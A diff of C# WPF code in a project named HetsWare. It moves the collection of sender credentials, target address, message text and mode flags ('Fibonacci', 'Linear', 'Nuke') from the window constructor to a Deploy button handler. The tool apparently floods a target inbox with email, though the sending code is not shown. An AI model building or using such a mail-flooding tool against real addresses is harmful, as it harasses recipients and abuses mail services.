@@ -31,23 +31,12 @@ namespace HetsWare
         private string MailTitle => MailTitleTextBox.Text;
         private string MailBody => MailBodyTextBox.Text;
         private BackgroundWorker backgroundWorker1 = new BackgroundWorker();
-        private List<object> arguments;
 
         public MainWindow() {
             backgroundWorker1 = new BackgroundWorker();
             InitializeComponent();
             InitializeBackgroundWorker();
             backgroundWorker1.WorkerSupportsCancellation = true;
-            arguments = new List<object>(); //<---list of arguments to migrate to the asynchronous thread.
-            arguments.Add(SourceMail);
-            arguments.Add(Password);
-            arguments.Add(TargetMail);
-            arguments.Add(MailTitle);
-            arguments.Add(MailBody);
-            arguments.Add(DefaultRadioButton.IsChecked);
-            arguments.Add(FibonacciRadioButton.IsChecked);
-            arguments.Add(LinearRadioButton.IsChecked);
-            arguments.Add(NukeRadioButton.IsChecked);
         }
         /// <summary>
         /// Method for adding events handlers to the background worker...
@@ -64,7 +53,7 @@ namespace HetsWare
         private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e) {
             
             BackgroundWorker worker = sender as BackgroundWorker;
-            List<object> genericlist = e.Argument as List<object>; //<---Properites sent from the main thread.
+            List<object> genericlist = e.Argument as List<object>; //<---Properites sent from the main thread via DoWorkEventArgs e.
             string sourcemail = genericlist[0].ToString();
             string password = genericlist[1].ToString();
             string targetmail = genericlist[2].ToString();
@@ -151,10 +140,21 @@ namespace HetsWare
             }
         }
             private void DeployButton_Click(object sender, RoutedEventArgs e) {
+
+            List<object>arguments = new List<object>(); //<---list of arguments to migrate to the asynchronous thread.
+            arguments.Add(SourceMail);
+            arguments.Add(Password);
+            arguments.Add(TargetMail);
+            arguments.Add(MailTitle);
+            arguments.Add(MailBody);
+            arguments.Add(DefaultRadioButton.IsChecked);
+            arguments.Add(FibonacciRadioButton.IsChecked);
+            arguments.Add(LinearRadioButton.IsChecked);
+            arguments.Add(NukeRadioButton.IsChecked);
             try {                    
                 if (backgroundWorker1.IsBusy != true) {
                     // Start the asynchronous operation.
-                    backgroundWorker1.RunWorkerAsync(arguments);
+                    backgroundWorker1.RunWorkerAsync(arguments); //<--- Injecting properties to the asyc thread.
                     // Disable the Start button until 
                     // the asynchronous operation is done.
                     this.DeployButton.IsEnabled = false;
